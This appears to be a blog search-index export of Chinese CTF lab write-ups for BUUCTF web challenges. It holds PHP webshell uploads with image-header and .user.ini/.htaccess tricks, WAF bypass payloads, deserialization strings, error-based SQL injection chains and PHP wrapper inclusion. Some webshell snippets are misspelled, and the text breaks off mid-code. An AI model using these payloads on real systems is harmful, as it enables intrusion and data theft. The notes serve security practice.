<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>buuctf</title>
    <url>/2022/01/16/buuctf/</url>
    <content><![CDATA[<h1 id="buuctf-http"><a href="#buuctf-http" class="headerlink" title="buuctf http"></a>buuctf http</h1><p>考察http,感觉多多少少有点忘记了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span><br></pre></td></tr></table></figure>

<p>提示我们抓包之后，修改服务器</p>
<p><strong>服务器伪造</strong></p>
<p>referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p>
<p><strong>修改浏览器</strong></p>
<p>发包之后又提示我们要用Syclover的浏览器，修改浏览器user-agent</p>
<p>ip<strong>伪造</strong></p>
<p>No!!!you can only read this locally!!!</p>
<p>提示我们要用本地Ip链接</p>
<p>X-Forwarded-For: 127.0.0.1</p>
<h1 id="buuctf-upload"><a href="#buuctf-upload" class="headerlink" title="buuctf upload"></a>buuctf upload</h1><p>文件上传漏洞，尝试着上传个一句话木马，但是弹窗要求文件类型为image，抓包后在content-type修改为image/jpeg,然后发包，在响应文中看到No!php!    可能是黑名单过滤，因此可以尝试</p>
<p>基于文件后缀名验证方式的分类：<br>1、基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。<br>2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。<br>这一关禁止.jsp、.php、.asp、.aspx后缀名的文件上传。</p>
<p>但是可以其他后缀名嘛，例如php1、php2、phtml、php5等等。</p>
<p>在尝试之后发现phtml可行</p>
<p>然后上传文件类型为phtml的一句话木马，抓包后修改文件类型为image/jpeg,然后发包，响应文件中提示不能是&lt;?,然后考虑将文件内容修改为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a? <span class="tag">&lt;<span class="name">scrit</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>eal($_REUEST[1])</span><br></pre></td></tr></table></figure>

<p>现在需要知道图片的保存路径了。<br>一般都是upload/filename</p>
<h1 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h1><p>上传一句话木马，抓包，发现没抓上，一直以为是我操作的问题，后来看了wp知道是没有上传上，然后就上传一个文件后缀为jpg的一句话木马，发现上传成功，但是蚁剑要求的是php文件，与市场是将文件后缀修改为php,但是没有上传成功，然后又尝试了phtml，成功。</p>
<p>.phtml文件告诉网络服务器，这些文件是由服务器生成的带有动态内容的html文件，就像浏览器中的.php文件表现一样。</p>
<h1 id="RoarCTF-2019-Easy-Calc1-php字符串解析漏洞"><a href="#RoarCTF-2019-Easy-Calc1-php字符串解析漏洞" class="headerlink" title="[RoarCTF 2019]Easy Calc1    php字符串解析漏洞"></a>[RoarCTF 2019]Easy Calc1    php字符串解析漏洞</h1><p>打开是一个计算器，感觉没什莫用，尝试了一下ssti,不是，直接看源代码，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br></pre></td></tr></table></figure>

<p>根据这个提示查看文件calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现绕过了许多东西</p>
<!--I've set up WAF to ensure security.-->

<p>既要绕过防火墙，又要绕过黑名单，通过num来进行传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump（）  打印变量相关信息</span><br><span class="line">chr()         返回指定的字符</span><br><span class="line">scandir()     列出指定文件和目录</span><br><span class="line">file_get_contents()  讲整个文件读入一个字符串</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用php的解析特性，绕过防火墙检测。因为php解析GET POST请求的时候会自动过滤掉空格，而防火墙不会。</p>
<p>为什么要在num前加一个空格？</p>
<p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">    ?num=file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h1><p>扫描发现压缩包，打开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反序列化，关键是绕过</p>
<p>绕过_wakeup(),private</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span>=<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);<span class="comment">//传入变量</span></span><br><span class="line">  var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>序列化后是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把后面的2改为3或以上即可Name</p>
<p>然后url识别不了，改为”%22</p>
<p>因为成员（属性）是<strong>private</strong>，所以要在类名和成员名前加这个url编码是空的意思。 因为生产序列化时不会把这个也输出。**%00**空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h1><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1,2,3#’’ at line 1</p>
<p>可知union select被过滤，uunionnion,sselectelect可绕过</p>
<p>后来操作可知or也被过滤，oorr可绕过</p>
<p>根据报错提示知道哪些被过滤了，双写绕过即可</p>
<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>扫描</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h2><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php 弱类型总结 - Mrsm1th - 博客园 (cnblogs.com)</a></p>
<h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php 弱类型总结 - Mrsm1th - 博客园 (cnblogs.com)</a></p>
<p>数字太长绕过方式有：</p>
<p>money[]=1</p>
<p>科学数字计数法</p>
<h1 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h1><p>打开后只有一个输入框，但是根据题目，考点不应该是sql注入，但还是尝试了一下，果然不是。</p>
<p>然后看了wp，抓包之后发包，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>



<p>然后网上搜到md5($pass,true)的漏洞，得知ffifdyop，·在本地环境试验ffifdyop，输出的开头是’or’6xxxxxx<br>在数据库语句里就构成了select * from ‘admin’ where password= ‘’or’6xxxxxx ’ 相当于 password= ‘’ or 1 变成永真，</p>
<p>后面只要是数字，就可以使他永远为真。后面，MD5绕过即可</p>
<h1 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里涉及三个参数，text,file,password</p>
<p>其中text的内容为welcome to the zjctf，可以利用伪协议data://， 用户写入的数据作为输入流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>

<p>访问useless.php文件的时候，发现读不出来，然后尝试使用伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$password</span>=<span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>不理解参数为什莫要传入到最上面，而不是在$password=new Flag();中，传入参数</p>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(43条消息) PHP伪协议详解_cosmoslin的博客-CSDN博客_php 伪协议详解</a></p>
<h1 id="极客大挑战-2019-Upload-1-文件上传"><a href="#极客大挑战-2019-Upload-1-文件上传" class="headerlink" title="[极客大挑战 2019]Upload 1(文件上传)"></a>[极客大挑战 2019]Upload 1(文件上传)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用GIF89a &lt;script language=</span><br></pre></td></tr></table></figure>

<h1 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h1><p>上传.php文件，但是提示后缀名错误。于是上传.jpg类型的文件，但是又提示&lt;?不允许，于是上传内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;s lnguage=&quot;php&quot;&gt;eval($_GT[1]);</span><br></pre></td></tr></table></figure>

<p>但是又提示exif_imagetype:not image!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exif_imagetype</span><br><span class="line">(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">exif_imagetype — 判断一个图像的类型</span><br><span class="line"></span><br><span class="line">说明</span><br><span class="line">exif_imagetype ( string $filename ) : int</span><br><span class="line"></span><br><span class="line">exif_imagetype() 读取一个图像的第一个字节并检查其签名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>说明后端会截取文件内容的一部分进行判断</p>
<p>因此可以采用<strong>GIF89a图片头文件欺骗，</strong></p>
<p>于是上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script la</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eal($_GET[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>因为是图片马，不是php脚本文件，无法被解析运行。但是我们发现目录下有个index.php文件，可以利用这个文件，向其中写入写入文件，文件中再包含文件。执行木马。</p>
<p>1.上传user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">ato_prepend_file=</span><br></pre></td></tr></table></figure>

<p>2.上传图片马，文件名为1.jpg</p>
<h1 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">报表名</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(informatio</span><br><span class="line">n_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">爆列名</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(informati</span><br><span class="line">on_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">密码</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),</span><br><span class="line">1))or&#x27;1&amp;password=1</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),</span><br><span class="line">1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-HardSQL1-1"><a href="#极客大挑战-2019-HardSQL1-1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h1><p>上传图片木马成功，抓包之后，修改为phtml,php5,PHp都不可以，遇到这种情况有两种解决办法</p>
<p>1.上传.user.ini文件，在上传所包含的文件为图片马，利用var_dump</p>
<p>但是前提必须是有可以利用的php文件</p>
<p>2.先上传图片马，然后上传.htaccess文件，内容为SetHandler application/x-httpd-php，作用是将所有的文件当作php文件来解析</p>
<p>参考文章：<a href="https://www.cnblogs.com/HelloCTF/p/12987570.html">.user.ini和.htaccess - Hel10 - 博客园 (cnblogs.com)</a></p>
<h1 id="网鼎杯-2020-青龙组-AreUSerialz1"><a href="#网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz1"></a>[网鼎杯 2020 青龙组]AreUSerialz1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span 